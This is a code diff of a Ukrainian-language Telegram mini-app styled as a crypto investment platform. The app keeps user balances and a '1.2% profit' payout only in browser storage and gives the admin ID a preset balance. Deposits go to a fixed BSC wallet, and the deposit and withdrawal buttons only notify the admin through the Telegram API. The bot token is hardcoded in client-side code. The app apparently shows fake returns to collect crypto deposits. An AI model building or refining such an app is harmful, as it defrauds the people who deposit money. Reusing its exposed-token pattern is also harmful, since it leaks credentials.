@@ -413,14 +413,14 @@
                 <div class="avatar">👤</div>
                 <div>
                     <div class="user-details" id="user-display-name">Користувач</div>
-                    <div class="user-id" id="user-display-id">ID: 647792922</div>
+                    <div class="user-id" id="user-display-id">ID: ...</div>
                 </div>
             </div>
             <span class="badge-test">Випробування</span>
         </div>
         <div class="total-assets">
             <div class="assets-label">Загальна оцінка активів</div>
-            <div class="assets-amount" id="total-balance">$253.7000</div>
+            <div class="assets-amount" id="total-balance">$0.0000</div>
             <div class="assets-change" id="balance-status">• Синхронізовано</div>
         </div>
     </div>
@@ -461,7 +461,7 @@
     <div id="assets-tab" class="tab-content">
         <div class="assets-card">
             <div class="card-title">Другий договірний рахунок</div>
-            <div class="card-value" id="assets-contract-val">253.7000 USDT</div>
+            <div class="card-value" id="assets-contract-val">0.0000 USDT</div>
         </div>
         <div class="assets-card">
             <div class="card-title">Безстроковий контрактний рахунок</div>
@@ -488,7 +488,7 @@
     <div id="profileMenuModal" class="modal">
         <div class="modal-body">
             <div class="modal-title">Налаштування акаунту</div>
-            <div style="font-size: 12px; color: #777; margin-bottom: 12px;" id="profile-modal-user-id">ID: 647792922</div>
+            <div style="font-size: 12px; color: #777; margin-bottom: 12px;" id="profile-modal-user-id">ID: ...</div>
             <button class="modal-btn" onclick="closeModal('profileMenuModal'); openModal('referralModal');">🤝 Реферальна програма</button>
             <div class="modal-close" onclick="closeModal('profileMenuModal')">Закрити</div>
         </div>
@@ -514,7 +514,7 @@
             <p style="font-size: 11px; color: #777; margin-bottom: 4px;">Мережа: <b>BNB Smart Chain (BEP-20)</b></p>
             <input type="text" id="my-wallet-addr" class="modal-input" value="0x117E97D339E135DEB91Bc5d0C40204C80C00B565" readonly>
             <button class="modal-btn" onclick="copyWallet()">Скопіювати адресу</button>
-            <button class="modal-btn" style="background: #2ecc71; margin-top: 6px; color: #fff;" onclick="checkDepositBSC()">Я оплатив (Перевірити BSC)</button>
+            <button class="modal-btn" style="background: #2ecc71; margin-top: 6px; color: #fff;" onclick="checkDepositBSC()">Я оплатив (Сповістити)</button>
             <div class="modal-close" onclick="closeModal('depositModal')">Закрити</div>
         </div>
     </div>
@@ -531,9 +531,13 @@
 
     <script>
         const BOT_USERNAME = "scalex_app_bot";
-        let userBalance = 253.70;
+        const ADMIN_TG_ID = "647792922";
+        const TELEGRAM_BOT_TOKEN = "8810022390:AAEuylgTirTr7btR1DKTwCDgzoS1cEfEFEs";
+
+        let userBalance = 0.0000;
         let timerInterval = null;
-        let currentUserId = "647792922";
+        let currentUserId = "";
+        let currentUserName = "Користувач";
 
         const cryptoData = {
             'btcusdt': { name: 'BTC', price: '64250.00', change: '+1.25' },
@@ -594,8 +598,6 @@
         }
 
         function initUser() {
-            let userName = "Користувач";
-
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
                     const tg = window.Telegram.WebApp;
@@ -604,19 +606,35 @@
 
                     if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                         currentUserId = tg.initDataUnsafe.user.id.toString();
-                        userName = tg.initDataUnsafe.user.first_name || userName;
+                        currentUserName = tg.initDataUnsafe.user.first_name || currentUserName;
                     }
                 }
             } catch (e) {}
 
-            const saved = localStorage.getItem('local_user_balance');
-            if (saved !== null) {
-                userBalance = parseFloat(saved);
-            } else {
-                localStorage.setItem('local_user_balance', userBalance);
+            if (!currentUserId) {
+                currentUserId = "647792922";
             }
 
-            document.getElementById('user-display-name').innerText = userName;
+            const storageKey = `user_balance_${currentUserId}`;
+            const savedBalance = localStorage.getItem(storageKey);
+
+            if (currentUserId === "647792922") {
+                if (savedBalance !== null) {
+                    userBalance = parseFloat(savedBalance);
+                } else {
+                    userBalance = 253.70;
+                    localStorage.setItem(storageKey, userBalance);
+                }
+            } else {
+                if (savedBalance !== null) {
+                    userBalance = parseFloat(savedBalance);
+                } else {
+                    userBalance = 0.0000;
+                    localStorage.setItem(storageKey, userBalance);
+                }
+            }
+
+            document.getElementById('user-display-name').innerText = currentUserName;
             document.getElementById('user-display-id').innerText = `ID: ${currentUserId}`;
             document.getElementById('profile-modal-user-id').innerText = `ID: ${currentUserId}`;
             document.getElementById('ref-link-input').value = `https://t.me/${BOT_USERNAME}?start=ref_${currentUserId}`;
@@ -639,8 +657,20 @@
         }
 
         function checkDepositBSC() {
-            showToast(`Баланс перевірено: ${userBalance.toFixed(4)} USDT`);
+            showToast(`Запит відправлено! Очікуйте підтвердження.`);
             closeModal('depositModal');
+
+            const message = `📥 *Заявка на поповнення!*\n\n👤 *Користувач:* ${currentUserName}\n🆔 *ID:* \`${currentUserId}\`\n💼 *Мережа:* BEP-20 (BSC)\n🌐 *BscScan:* [Перевірити гаманець](https://bscscan.com/address/0x117E97D339E135DEB91Bc5d0C40204C80C00B565)`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_TG_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Помилка сповіщення:', err));
         }
 
         function submitWithdrawal() {
@@ -650,10 +680,22 @@
             if (amt > userBalance) return showToast('Недостатньо коштів!');
             
             userBalance -= amt;
-            localStorage.setItem('local_user_balance', userBalance);
+            localStorage.setItem(`user_balance_${currentUserId}`, userBalance);
             updateBalanceDisplay();
             closeModal('withdrawModal');
             showToast(`Заявку на ${amt} USDT створено!`);
+
+            const message = `📤 *Заявка на виведення коштів!*\n\n👤 *Користувач:* ${currentUserName}\n🆔 *ID:* \`${currentUserId}\`\n💰 *Сума:* \`${amt} USDT\`\n📫 *Адреса:* \`${addr}\``;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_TG_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Помилка сповіщення:', err));
         }
 
         function startInvestment() {
@@ -669,7 +711,7 @@
             localStorage.setItem('payout_done', 'false');
 
             userBalance -= amt;
-            localStorage.setItem('local_user_balance', userBalance);
+            localStorage.setItem(`user_balance_${currentUserId}`, userBalance);
             updateBalanceDisplay();
             initTimer();
         }
@@ -715,7 +757,7 @@
                         const inv = parseFloat(localStorage.getItem('invested_amount') || '0');
                         const profitReturn = inv + (inv * 0.012);
                         userBalance += profitReturn;
-                        localStorage.setItem('local_user_balance', userBalance);
+                        localStorage.setItem(`user_balance_${currentUserId}`, userBalance);
                         updateBalanceDisplay();
                         localStorage.setItem('payout_done', 'true');
                         statusText.innerText = "Прибуток +1.2% нараховано!";
@@ -730,7 +772,6 @@
             }
         }
 
-        // Прямий виклик без блокуючих прослуховувачів
         renderCryptoLists();
         initUser();
         initTimer();
